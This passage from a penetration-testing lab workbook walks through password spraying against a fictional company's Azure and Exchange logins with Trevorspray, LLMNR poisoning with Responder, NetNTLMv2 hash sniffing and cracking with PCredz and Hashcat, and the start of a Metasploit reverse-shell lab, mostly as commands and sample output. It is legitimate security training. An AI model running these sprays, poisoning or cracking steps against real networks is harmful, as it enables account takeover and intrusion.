 [-p PASSWORDS [PASSWORDS ...]] [--url URL] [-r DOMAIN]
 [--export-tenants FILE] [-t THREADS] [-f] [-d DELAY]
 [-ld LOCKOUT_DELAY] [-j JITTER] [-e] [-nl]
 [--ignore-lockouts] [--timeout TIMEOUT]
 [--random-useragent] [-6] [--proxy PROXY] [-v]
 [-s USER@SERVER [USER@SERVER ...]] [-i KEY] [-b BASE_PORT]
 [-n] [--subnet SUBNET] [--interface INTERFACE]
A password sprayer with the option to load-balance traffic through SSH hosts
options:
-h, --help show this help message and exit
basic arguments:
-m {jumpcloud,adfs,auth0,owa,anyconnect,okta,msol}, --module 
{jumpcloud,adfs,auth0,owa,anyconnect,okta,msol}
 Spray module to use (default: msol)
-up USERPASS [USERPASS ...], --userpass USERPASS [USERPASS ...]
 file(s) containing username and password pairs
 (format: 'username:password')
-u USERS [USERS ...], --users USERS [USERS ...]
 Usernames(s) and/or file(s) containing usernames
-p PASSWORDS [PASSWORDS ...], --passwords PASSWORDS [PASSWORDS ...]
 Password(s) and/or file(s) containing passwords
--url URL The URL to spray against
-r DOMAIN, --recon DOMAIN, --enumerate DOMAIN
...trimmed for brevity...
```

Trevorspray has a lot of options, but we will be using the following:

- Our users.txt file with the list of email addresses 1.
- Our passwords.txt file with the list of passwords 2.
- The URL for authentication against hiboxy.com, which we'll get momentarily via reconnaissance 3.

Let's start by cleaning up any prior results, then doing some reconnaissance against hiboxy.com:

trevorspray --recon hiboxy.com

#### Expected Results

```
sec560@560vm:~/users$ trevorspray --recon hiboxy.com
[INFO] Command: /usr/local/bin/trevorspray --recon hiboxy.com
[INFO] Checking MX records for hiboxy.com
[WARN] No results.
[INFO] Checking TXT records for hiboxy.com
[WARN] No results.
[INFO] Checking OpenID configuration at https://login.windows.net/hiboxy.com/.well-known/openid-
configuration
[INFO] NOTE: You can spray against "token_endpoint" with --url!!
[SUCC] 
 "token_endpoint": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/
oauth2/token",
...trimmed for brevity...
[INFO] Checking autodiscover info at https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/
test@hiboxy.com?Protocol=Autodiscoverv1
[WARN] No results.
[INFO] Attempting to discover OWA instances
[SUCC] Found OWA at https://autodiscover.hiboxy.com/autodiscover/autodiscover.xml
[SUCC] Found internal domain via NTLM: "hiboxy.com"
[SUCC] 
 "NetBIOS_Domain_Name": "HIBOXY",
 "NetBIOS_Computer_Name": "MAIL01",
 "DNS_Domain_name": "hiboxy.com",
 "FQDN": "mail01.hiboxy.com",
 "DNS_Tree_Name": "hiboxy.com"
}
...trimmed for brevity...
```

We have two potential targets from that recon. First, we get the "login.windows.net" URL, from the "token\_endpoint" field, and we also found Hiboxy's on-premise Exchange server. Remember that we found that with Nmap and GoWitness in Lab 2.1. Sometimes on-premise Exchange has security exceptions, such as no MFA requirement!

Because of Microsoft's Smart Lockout feature, we want to choose our password guessing options carefully. Let's start with our recently enumerated credentials from known breaches.

trevorspray --userpass valid.creds --url 'https://login.windows.net/1c0060e4-c4db-4777 a48b-34a1515e33bf/oauth2/token'

#### Expected Results

sec560@560vm:~/users\$ trevorspray --userpass valid.creds --url 'https://login.windows.net/ 1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/token'

[INFO] Command: /usr/local/bin/trevorspray --userpass valid.creds --url https:// login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/token

[INFO] Spraying 4 users against https://login.windows.net/1c0060e4-c4db-4777-

a48b-34a1515e33bf/oauth2/token at Tue Sep 23 18:56:43 2025

[SUCC] abates@hiboxy.com:Metallica6 - AADSTS50131: Correct password but login was blocked.

[INFO] Running loot module: MSOLLooter

[INFO] Testing IMAP4 MFA bypass for abates@hiboxy.com

[WARN] IMAP MFA bypass failed for abates@hiboxy.com: b'LOGIN failed.'

...trimmed for brevity...

[INFO] Testing Exchange Online Powershell (EXO) MFA bypass for abates@hiboxy.com [SUCC] MFA bypass (Exchange Online Powershell) enabled for abates@hiboxy.com (https://

...trimmed for brevity...

[INFO] Finished spraying 4 users against https://login.windows.net/1c0060e4-c4db-4777 a48b-34a1515e33bf/oauth2/token at Tue Sep 23 18:56:59 2025

[SUCC] abates@hiboxy.com:Metallica6

[INFO] 1 valid users written to /home/sec560/.trevorspray/existent\_users.txt

[INFO] 1 valid user/pass combos written to /home/sec560/.trevorspray/valid\_logins.txt

#### If you see a Python stack trace...

If you see a stack trace like the following, you can safely ignore it for the purposes of this lab.

[ERRR] Traceback (most recent call last):

 File "/usr/local/lib/python3.12/dist-packages/trevorspray/lib/looters/msol.py", line 149, in test\_ews

 results = account.protocol.resolve\_names( ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Your results may differ here because of Smart Lockout. In the sample output, you can see the abates@hiboxy.com received AADSTS50131: Correct password but login was blocked as a login response. So, while we can't login, we have the right password, and the user has access to cloud resources of some sort.

Trevorspray then tries several other techniques to use the valid credentials against other endpoints to see if they require MFA. It identified Exchange Online Powershell as an MFA bypass! Also notice that it saves its results to ~/.trevorspray , making it easy to find and re-use the results.

Let's target the Exchange server, now. Remember, we found the Exchange server login page in Lab 2.1 using the http-authfinder.nse NSE script, and saw the OWA page when we scanned with GoWitness. Let's use Trevorspray to do a password spray attack against the on-premise Exchange OWA.

During recon, Trevorspray found the Exchange Autodiscover endpoint, which we'll provide as the URL (--url ) to target with the OWA module (-m owa):

#### [SUCC] Found OWA at https://autodiscover.hiboxy.com/autodiscover/autodiscover.xml

Combine that with the users.txt and a *really* bad password ( Password1), and we're ready to spray!

```
Command
 trevorspray -m owa --url "https://autodiscover.hiboxy.com/autodiscover/autodiscover.xml" -u
 users.txt -p 'Password1'
 Expected Results
  sec560@560vm:~/users$ trevorspray --m owa--url "https://autodiscover.hiboxy.com/
  autodiscover/autodiscover.xml" -u users.txt -p 'Password1'
  ...trimmed for brevity...
  [INFO] abates@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
  [INFO] alee@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
  [INFO] aparker@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
  [SUCC] bgreen@hiboxy.com:Password1 - Valid credential!
  [INFO] bking@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
  [INFO] bsanchez@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
  [INFO] bwebster@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
  [INFO] hmarsh@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
  [INFO] janderson@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
  [SUCC] jcooper@hiboxy.com:Password1 - Valid credential!
  [INFO] jlopez@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
  ...trimmed for brevity...
```

Fantastic! Two more passwords!

#### *7: Displaying the Results of Our Attack*

We can now see that several users have valid usernames and passwords. Some of these may have rights in our Azure Portal, and others may not. We need to do more work to understand which user is valid, and what they have access to. Here is the valid list of users and passwords:

#### Usernames and Passwords Found

You should have found these passwords. We've included the other passwords from the breach list for a full list of guessed credentials.

| User    | Login                        | Password       |
|---------|------------------------------|----------------|
| abates  | abates@hiboxy.com            | Metallica6     |
| aparker | aparker@hiboxy.com Oozle11   |                |
| mlara   | mlara@hiboxy.com             | Packardbell350 |
| slopez  | slopez@hiboxy.com            | Tibbetts3      |
| bgreen  | bgreen@hiboxy.com            | Password1      |
| jcooper | jcooper@hiboxy.com Password1 |                |

#### Conclusion

This lab started with us exploring the use of AADInternals to gain a good understanding of our tenant Azure environment. Many of the tools that we explored leverage Password Spraying to perform their function. We performed these attacks against a single Azure authentication endpoint and Microsoft Exchange using a single client identifier. While this isn't the only attack path, this is a very popular option for many testers.

A penetration tester can mount a successful campaign against a target organization using password spraying, username enumeration, and tenant identification. This can lead them to formulate attacks that provide an initial foothold in the environment or provide them the capability to mount a further attack. One valid set of credentials is all it takes.

## *Lab 2.4: Responder*

#### No VPN Required

This exercise does not require an OpenVPN connection. Internet access is required.

#### Objectives

- To obtain an NTLMv2 challenge-response by abusing LLMNR (using Responder) •
- To crack the NTLMv2 challenge-response using Hashcat, providing us with a valid set of credentials •
- To sniff a *NTLMv2* challenge/response exchange via *SMB* •
- To use Hashcat to determine the password from the sniffed *NTLMv2* authentication messages •

#### Lab Setup

VMs used:

- Linux •
- Windows 11 •

You'll need to have your Linux and Windows VMs booted for this lab. From the Linux VM, we will use Responder to "attack" the Windows VM. From here, our goal is to capture the NTLMv2 Challenge / Response and attempt an offline brute force attack.

To make sure this works properly, verify that you can ping from Linux to Windows.

#### If you can't ping Windows from Linux (click to expand)

- Make sure you are pinging the local IP address, not the IP address on the VPN ( 10.254.25X.X). 1.
- Open an elevated command prompt in Windows and run 2.

#### Command

netsh advfirewall set allprofiles state off

Try pinging again 3.

If this doesn't work, contact a TA or Instructor.

#### Lab – Step-by-Step Instructions

#### *1: Launch Responder*

Let's open a terminal prompt in Linux. For Responder to listen on privileged ports (<1024 by default), we'll need root privileges, so let's use sudo to elevate privileges to root. Responder is located in /pentest/exploitation/responder .

| Command                |     |  |
|------------------------|-----|--|
| Jaminana               |     |  |
|                        |     |  |
| sudo Responder.py -l e | th0 |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |
|                        |     |  |

#### Expected Results sec560@560vm:~\$ sudo Responder.py -I eth0 \_\_ .----.-----.-----.-----.-----.-----.--| |.-----.----. | \_| -\_\_|\_\_ --| \_ | \_ | | \_ || -\_\_| \_| |\_\_| |\_\_\_\_\_|\_\_\_\_\_| \_\_|\_\_\_\_\_|\_\_|\_\_|\_\_\_\_\_||\_\_\_\_\_|\_\_| |\_\_| [+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] DHCP [OFF] [+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [OFF] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] MQTT server [ON] RDP server [ON] DCE-RPC server [ON] WinRM server [ON] SNMP server [ON] [+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Force ESS downgrade [OFF] [+] Generic Options:

Responder NIC [eth0]

Responder IP [192.168.188.140]

Responder IPv6 [fe80::20c:29ff:fe84:f750]

Challenge set [random]

Don't Respond To Names ['ISATAP', 'ISATAP.LOCAL']

 Don't Respond To MDNS TLD ['\_DOSVC'] TTL for poisoned response [default]

[+] Current Session Variables:

Responder Machine Name [WIN-MZKZ8QUOUEU]

Responder Domain Name [7MVT.LOCAL]

Responder DCE-RPC Port [45769]

- [\*] Version: Responder 3.1.7.0
- [\*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
- [\*] To sponsor Responder: https://paypal.me/PythonResponder
- [+] Listening for events...
- [!] Error starting TCP server on port 80, check permissions or other servers running.
- [!] Error starting SSL server on port 5986, check permissions or other servers running.
- [!] Error starting SSL server on port 443, check permissions or other servers running.
- [!] Error starting SSL server on port 636, check permissions or other servers running.
- [!] Error starting TCP server on port 53, check permissions or other servers running.

Responder should provide a rather verbose output. You can ignore the errors; we don't need all the servers to be up and running (since our machine is already listening on those ports). You'll see a few notable things:

Poisoners: You'll see the poisoning techniques in use including LLMNR, NBNS (NBT-NS), and DNS/MDNS. •

Servers: We're going to be targeting SMB for the attack •

Interface: We specified the eth0 interface with -I •

Along with the different warnings, Responder should print Listening for events... .

#### *2: Switch to Windows machine*

Let's now switch to our victim Windows machine, where you'll be logging on as the clark user using the password Qwerty12.

Log out of your Windows VM. Click on the Windows icon in the lower left corner, then click on the user icon (the little head and shoulders). Then click on 'Sign out'.

Then, log in with the credentials below:

Username: clark •

Password: Qwerty12 •

#### *3: Opening Explorer window*

Let's use the Start Menu's search feature to search for a network resource that does not exist. Windows will try opening an SMB connection to the non-existent system. Remember, this will trigger a LLMNR request, as the Windows machine will try to resolve the hostname using a multicast LLMNR request. It's these types of requests Responder will respond to!

On the Windows VM, logged in as Clark, let's attempt an SMB session to \\windows01.

(If you use the key combo WIN+ S , you can skip straight to step 3 below.)

- Click "Start" 1.
- Click the Windows Search box at the top of the start menu. 2.
- Type \\windows01 in the search box and hit enter 3.

![](SEC560_WorkBook1_page_143_Picture_7.jpeg)

The connection will hang for a few seconds, after which it will return "Access is Denied" and request credentials.

It's important to note that, at this point, your Windows machine already attempted to sign on using the credentials of your current Windows session. Responder should thus already have been able to obtain an NTLMv2 challenge-response...

After Windows authenticates a number of times, you will be presented with this dialog. You can simply close it; we already grabbed the hashes!

![](SEC560_WorkBook1_page_144_Picture_0.jpeg)

#### *4: Review NTLMv2 challenge/response hash*

Let's switch back to our Linux machine so we can observe whether our attempt was successful!

In the window where Responder is running, you should now see that an NTLMv2 challenge-response was captured (see Expected Results for an example of what that should look like). If you do not see it immediately, you may need to scroll up in the window. The entry should clearly indicate the hash is for clark and was collected from your Windows machine.

#### Expected Results

- [\*] [LLMNR] Poisoned answer sent to fe80::601a:6621:2ac0:fec1 for name WINDOWS01
- [\*] [MDNS] Poisoned answer sent to 192.168.188.1 for name WINDOWS01.local
- [\*] [LLMNR] Poisoned answer sent to 192.168.188.1 for name WINDOWS01
- [\*] [MDNS] Poisoned answer sent to fe80::601a:6621:2ac0:fec1 for name WINDOWS01.local

[SMB] NTLMv2-SSP Client : 192.168.188.139

[SMB] NTLMv2-SSP Username : SEC560-WINDOWS\clark

[SMB] NTLMv2-SSP Hash : clark::SEC560-

WINDOWS:bf32e22da751ed23:F36F41AB5FE51EC780D864B8E7433

F40:010100000000000080A13BE12F27DC013C852FFA72C5A7DE000000000200080038004F005300460001001E005700 49004E002D003300450038004F0037004F004D0037005A003500380004003400570049004E002D003300450038004F00 37004F004D0037005A00350038002E0038004F00530046002E004C004F00430041004C000300140038004F0053004600 2E004C004F00430041004C000500140038004F00530046002E004C004F00430041004C000700080080A13BE12F27DC01 060004000200000008005000500000000000000000000000002000009B1AB1236365DFEA5CC0FED5116F378E40A1239C B576ED245D4761FF9ECAB6A57E728DDA270BE6C5DDF9493F3BE2C86BAFC3BE329E98D20796EACE7B7B1D8B170A001000 0000000000000000000000000000000009001C0063006900660073002F00570049004E0044004F005700530030003100 0000000000000000

Your output may vary slightly, but should include at least one line showing NTLMv2-SSP Hash and the hash itself.

Once you see the hash, you can quit Responder by pressing CTRL+C.

#### *5: Use Hashcat to crack the obtained hash*

It's important to note the difference between an NTLM hash and a NetNTLMv2 hash:

- An NT hash (sometimes called an "NTLM hash") is an unsalted MD4 hash of the password that is used by Windows to store passwords in the SAM file (local users) or in the NTDS.dit file (domain users). This type of hash can be used in a *Pass-the-Hash* attack! •
- An NTLMv2 hash (sometimes called a "NetNTLMv2 hash") is a challenge-response that, when sniffed, can be used to launch an offline brute force attack. This type of hash cannot be used in a Pass-the-Hash attack, but could potentially be relayed in an *SMB Relaying* attack! •

The hashes captured by Responder are by default saved in a .txt file in /pentest/exploitation/responder/logs with a name that resembles the filename below. Your actual filename will thus depend on the IP address of your Windows machine.

We need to specify the hash-type to be targeted by Hashcat (NetNTLMv2), which we can do by using the -m flag:

hashcat -m 5600 /pentest/exploitation/responder/logs/SMB-NTLMv2-SSP-\* /usr/share/wordlists/rockyou.txt

#### Expected Results

sec560@560vm:~\$ hashcat -m 5600 /pentest/exploitation/responder/logs/SMB-NTLMv2-SSP-\* /usr/share/

wordlists/rockyou.txt hashcat (v6.2.6) starting

...trimmed for brevity...

CLARK::SEC560-

WINDOWS:bf32e22da751ed23:f36f41ab5fe51ec780d864b8e7433f40:010100000000000080a1

3be12f27dc013c852ffa72c5a7de000000000200080038004f005300460001001e00570049004e002d0033004500 38004f0037004f004d0037005a003500380004003400570049004e002d003300450038004f0037004f004d003700 5a00350038002e0038004f00530046002e004c004f00430041004c000300140038004f00530046002e004c004f00 430041004c000500140038004f00530046002e004c004f00430041004c000700080080a13be12f27dc0106000400 0200000008005000500000000000000000000000002000009b1ab1236365dfea5cc0fed5116f378e40a1239cb576 ed245d4761ff9ecab6a57e728dda270be6c5ddf9493f3be2c86bafc3be329e98d20796eace7b7b1d8b170a001000 0000000000000000000000000000000009001c0063006900660073002f00570049004e0044004f00570053003000

#### 31000000000000000000:Qwerty12

Session..........: hashcat

Status...........: Cracked

Hash.Mode........: 5600 (NetNTLMv2)

Hash.Target......: CLARK::SEC560-WINDOWS:bf32e22da751ed23:f36f41ab5fe5...000000

Time.Started.....: Tue Sep 16 17:41:49 2025 (0 secs) Time.Estimated...: Tue Sep 16 17:41:49 2025 (0 secs)

Kernel.Feature...: Pure Kernel (password length 0-256 bytes)

Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#01........: 1594.6 kH/s (1.46ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)

Progress.........: 372736/14344387 (2.60%)

Rejected.........: 0/372736 (0.00%)

Restore.Point....: 368640/14344387 (2.57%)

Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1

Candidate.Engine.: Device Generator

Candidates.#01...: ROBERT23 -> 31december

Hardware.Mon.#01.: Util: 26%

Started: Tue Sep 16 17:41:38 2025 Stopped: Tue Sep 16 17:41:50 2025

Hashcat will start cracking the provided hashes using the rockyou.txt password file immediately. In our specific scenario, cracking will be extremely fast!

One important thing to note is that Hashcat doesn't "re-crack" hashes. If it has already cracked a certain hash, it will just inform you that it didn't load any hashes when attempting to crack them again.

To view cracked hashes, we can use the Hashcat show function:

#### Command

hashcat -m 5600 /pentest/exploitation/responder/logs/SMB-NTLMv2-SSP-\*--show

#### Expected Results

sec560@560vm:~\$hashcat -m 5600 /pentest/exploitation/responder/logs/SMB-NTLMv2-SSP-\*--show CLARK::SEC560-WINDOWS:bf32e22da751ed23:f36f41ab5fe51ec780d864b8e7433f40:010100000000000080a1 3be12f27dc013c852ffa72c5a7de000000000200080038004f005300460001001e00570049004e002d0033004500 38004f0037004f004d0037005a003500380004003400570049004e002d003300450038004f0037004f004d003700 5a00350038002e0038004f00530046002e004c004f00430041004c000300140038004f00530046002e004c004f00 430041004c000500140038004f00530046002e004c004f00430041004c000700080080a13be12f27dc0106000400 0200000008005000500000000000000000000000002000009b1ab1236365dfea5cc0fed5116f378e40a1239cb576 ed245d4761ff9ecab6a57e728dda270be6c5ddf9493f3be2c86bafc3be329e98d20796eace7b7b1d8b170a001000 0000000000000000000000000000000009001c0063006900660073002f00570049004e0044004f00570053003000 31000000000000000000 :Qwerty12

Generally, Hashcat shows the full original hash, followed by a colon, followed by the plaintext password (in this case, Qwerty12).

When running Hashcat with the --show argument, instead of starting a new password cracking session, the command searches inside the ~/.local/share/hashcat/hashcat.potfile file for the hashes in the specified file ( SMBv2-NTLMv2-SSP-\* in this case) so that it can print any cracked passwords associated with those hashes.

#### *6: Capturing hashes with a sniffer*

For this lab, move to your Linux machine and invoke smbclient to access your Windows VM via SMB. Just enter a bogus username and password so we won't successfully authenticate. While that exchange occurs, we'll be running tcpdump on Linux to sniff the exchange, which we can then crack.

This lab models a number of different scenarios, a few of which are outlined here:

- You have s a machine-in-the-middle position and captures authentication 1.
- You run a tool or service similar to Responser.py that waits for a vulnerability scanner to connect to the service 2.
- You are allowed to get a user to try to mount a share on an attacker-controlled machine 3.

Go to your Linux virtual machine. Here we first run our tcpdump sniffer to grab packets associated with the authentication exchange. You need two terminal windows: one for tcpdump to sniff and another for smbclient to do the authentication to Windows. Launch two terminal windows.

In the first terminal, run tcpdump as follows:

![](SEC560_WorkBook1_page_148_Figure_0.jpeg)

The -n tells it to show numeric ports and IP addresses rather port names and host names while the v makes tcpdump print out how many packets it has received so far. The -w option causes tcpdump to put its packets in a packet capture file for us. We'll focus only on packets associated with port 445.

While tcpdump is running, in another terminal, invoke smbclient to perform an authentication attempt with your Windows VM.

To simulate a user authenticating, we'll authenticate to our Windows VM as the user clark with the password Qwerty12. In the other Linux terminal, type:

smbclient //YOUR\_WINDOWS\_IP\_ADDRESS/c\$ -U clark --password=Qwerty12

#### Expected Results

sec560@560vm:~\$ smbclient //YOUR\_WINDOWS\_IP\_ADDRESS/c\$ -U clark --password=Qwerty12 tree connect failed: NT\_STATUS\_ACCESS\_DENIED

#### Replace YOUR\_WINDOWS\_IP\_ADDRESS!

Replace YOUR\_WINDOWS\_IP\_ADDRESS with the local address of your Windows VM (NOT the address like 10.254.25X.X).

The credentials are not valid for this system (as Clark is not administrative, hence the NT\_STATUS\_ACCESS\_DENIED response).

When you press Enter in Linux to run the smbclient command, you see a NT\_STATUS\_ACCESS\_DENIED response. More importantly, your tcpdump sniffer in the other window should show that you've captured some packets. You should see tcpdump output saying it has Got XX packets, where XX will be 11 or more.

#### You must exit tcpdump!

You must press CTRL-C in the tcpdump terminal or tcpdump will not write the packets into its capture file. We've gathered our packets.

#### *7: Extract hashes from Pcap file*

We will use PCredz to extract the password hashes from the pcap file. The tool can extract "Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from

The PCredz tool is particular in where and how it is run. We need to run it from the directory containing the Pcredz executable.

Note: The executable is named Pcredz but the tool is called PCredz (note the changing case of the "C"). Going forward, we'll refer to it by the executable name, Pcredz .

Now, let's run Pcredz and extract the hash!

sudo /pentest/password-recovery/pcredz/Pcredz -vf /tmp/winauth.pcap

#### Expected Results

sec560@560vm:~\$ sudo /pentest/password-recovery/pcredz/Pcredz -vf /tmp/winauth.pcap Pcredz 2.0.3

Author: Laurent Gaffie <lgaffie@secorizon.com>

This script will extract NTLM (HTTP,LDAP,SMB,MSSQL,RPC, etc), Kerberos,

CC number scanning activated

Using TCPDump format

protocol: tcp 192.168.188.140:42080 > 192.168.188.139:445

NTLMv2 complete hash is: clark::WORKGROUP:

94e1cf2795d12c43:762EA0861341D23F4EFE754391B05603:

0101000000000000A145FD3A3527DC01F2274459D2B0DE770000000002001C005300450043003500360030002D00 570049004E0044004F005700530001001C005300450043003500360030002D00570049004E0044004F0057005300 04001C005300450043003500360030002D00570069006E0064006F007700730003001C0053004500430035003600 30002D00570069006E0064006F007700730007000800A145FD3A3527DC0106000400020000000800300030000000 0000000000000000000000003F12BD4097A9A97797E4606A69CEA2762B77F5787B71F853A51F478112D08AFB0A00 1000000000000000000000000000000000000900280063006900660073002F003100390032002E00310036003800 2E003100380038002E0031003300390000000000

/tmp/winauth.pcap parsed in: 0.0187 seconds (File size 0.00435 Mo).

We see the hash on the screen, and the previous command creates a file named /pentest/password-recovery/pcredz/ CredentialDump-Session.log that contains all the output above. In addition, the tool creates files in the /pentest/passwordrecovery/pcredz/logs/ directory named after the hash types found.

Let's take a look at the file containing hashes in the logs directory.

ls -l /pentest/password-recovery/pcredz/logs/

cat /pentest/password-recovery/pcredz/logs/NTLMv2.txt

#### Expected Results

sec560@560vm:~\$ ls -l /pentest/password-recovery/pcredz/logs/

total 4

-rw-r--r-- 1 root root 660 Sep 16 18:12 NTLMv2.txt

sec560@560vm:~\$ cat /pentest/password-recovery/pcredz/logs/NTLMv2.txt

clark::WORKGROUP:

94e1cf2795d12c43:762EA0861341D23F4EFE754391B05603:0101000000000000A145FD3A3

527DC01F2274459D2B0DE770000000002001C005300450043003500360030002D00570049004E0044004F0057005 30001001C005300450043003500360030002D00570049004E0044004F005700530004001C0053004500430035003 60030002D00570069006E0064006F007700730003001C005300450043003500360030002D00570069006E0064006 F007700730007000800A145FD3A3527DC01060004000200000008003000300000000000000000000000000000003 F12BD4097A9A97797E4606A69CEA2762B77F5787B71F853A51F478112D08AFB0A001000000000000000000000000 000000000000900280063006900660073002F003100390032002E003100360038002E003100380038002E0031003 300390000000000

We have the hash in the proper format so that we can then use hashcat to crack it.

hashcat -m 5600 /pentest/password-recovery/pcredz/logs/NTLMv2.txt /usr/share/wordlists/rockyou.txt

#### Expected Results

sec560@560vm:~\$ hashcat -m 5600 /pentest/password-recovery/pcredz/logs/NTLMv2.txt /usr/share/ wordlists/rockyou.txt

hashcat (v7.1.2-149-g8a99c8371) starting

[...header trimmed for brevity...]

#### CLARK::WORKGROUP:

94e1cf2795d12c43:762ea0861341d23f4efe754391b05603:0101000000000000a145fd3a3

527dc01f2274459d2b0de770000000002001c005300450043003500360030002d00570049004e0044004f0057005 30001001c005300450043003500360030002d00570049004e0044004f005700530004001c0053004500430035003 60030002d00570069006e0064006f007700730003001c005300450043003500360030002d00570069006e0064006 f007700730007000800a145fd3a3527dc01060004000200000008003000300000000000000000000000000000003 f12bd4097a9a97797e4606a69cea2762b77f5787b71f853a51f478112d08afb0a001000000000000000000000000 000000000000900280063006900660073002f003100390032002e003100360038002e003100380038002e0031003 300390000000000:Qwerty12

Session..........: hashcat Status...........: Cracked

Hash.Mode........: 5600 (NetNTLMv2)

Hash.Target......: CLARK::WORKGROUP:94e1cf2795d12c43:762ea0861341d23f4...000000

Time.Started.....: Tue Sep 16 18:20:19 2025 (0 secs) Time.Estimated...: Tue Sep 16 18:20:19 2025 (0 secs)

Kernel.Feature...: Pure Kernel (password length 0-256 bytes)

Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#01........: 1912.1 kH/s (1.39ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)

Progress.........: 372736/14344387 (2.60%)

Rejected.........: 0/372736 (0.00%)

Restore.Point....: 368640/14344387 (2.57%)

Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1

Candidate.Engine.: Device Generator

Candidates.#01...: ROBERT23 -> 31december

Hardware.Mon.#01.: Util: 39%

Started: Tue Sep 16 18:20:18 2025 Stopped: Tue Sep 16 18:20:21 2025

Hashcat found the password in the password file we used ( /usr/share/wordlists/rockyou.txt ).

Let's look at the cracked password by using the following command:

# Command hashcat -m 5600 --show --outfile-format 2 /pentest/password-recovery/pcredz/logs/NTLMv2.txt Expected Results sec560@560vm:~\$ hashcat -m 5600 --show --outfile-format 2 /pentest/password-recovery/pcredz/logs/ NTLMv2.txt Qwerty12

#### The options are:

-m 5600: NetNTLMv2 mode •

--show : Show the results •

--outfile-format 2 : Output format for the bare password (run hashcat -h | grep -A10 "Outfile Formats" to see available options) •

### Outfile Formats sec560@560vm:~\$hashcat -h | grep -A10 "Outfile Formats" - [ Outfile Formats] - # | Format ===+======== 1 | hash[ :salt ] 2 | plain 3 | hex\_plain 4 | crack\_pos 5 | timestampabsolute 6 | timestamprelative

To clean up, let's remove the PCredz log, the Hashcat potfile, and the Responder logs and database:

#### Command

sudo rm /home/sec560/.local/share/hashcat/hashcat.potfile sudo rm /pentest/password-recovery/pcredz/logs/NTLMv2.txt sudo rm /pentest/exploitation/responder/logs/\* sudo rm /pentest/exploitation/responder/Responder.db

<sup>/</sup>pentest/password-recovery/pcredz/logs/NTLMv2.txt : File containing the hashes •

Then, log out of your Windows machine (clark). Then, log back in as sec560.

Congratulations! You have successfully cracked a NetNTLMv2 challenge-response attained through two different techniques!

#### Conclusion

In this lab, you looked at how to perform a network-level attack with Responder to obtain NTLMv2 hashes and how we can use Hashcat to crack these hashes. This technique is useful for penetration testers to discern passwords and use them for gaining deeper access into target environments.

We've also seen the versatility of sniffing. We've used tcpdump to capture authentication, extracted hashes and cracked the NTLMv2 challenge/response, and cracked the hashes.

# *Lab 2.5: Metasploit and Meterpreter*

#### No VPN Required

This exercise does not require an OpenVPN connection. Internet access is required.

#### Objectives

your Windows machine temporarily. Speci fically, we exploit the Apache Cassandra service (version 2.1.3), an open source NoSQL database with a default security miscon figuration. Our Metasploit payload will consist of the Meterpreter stage, loaded via the reverse\_http stager, making a connection from the exploited box back to the attacker.

#### Lab Steps

You'll run this lab entirely on your own systems, with the vulnerable Apache Cassandra service on your Windows box getting exploited by your Linux virtual machine. On the slide, we depict Steps 1 through 4 of this lab. Note that throughout the entire lab, each of these step numbers will still apply.

- Step 1: Start the vulnerable Apache Cassandra service.
- Step 2-3: Exploit the target service, sending the reverse\_http stager as a payload with the Java Meterpreter stage.
- Step 4-6: Use Meterpreter running inside Cassandra's java.exe memory space, shoveling a reverse TCP connection back to the attacker.
- Step 7-9: Upgrade the Meterpreter shell and use advanced features.

#### Lab Setup

VMs used:

- Linux •
- Windows •

For this lab, you'll attack your Windows machine, causing it to run the Meterpreter. You will be running a vulnerable server. For this lab, we suggest you disconnect from the VPN.

Then, in Linux, run:

#### Command

ping -c 4 WINDOWS\_ETHERNET0\_ADDRESS

#### Replace WINDOWS\_ETHERNET0\_ADDRESS!

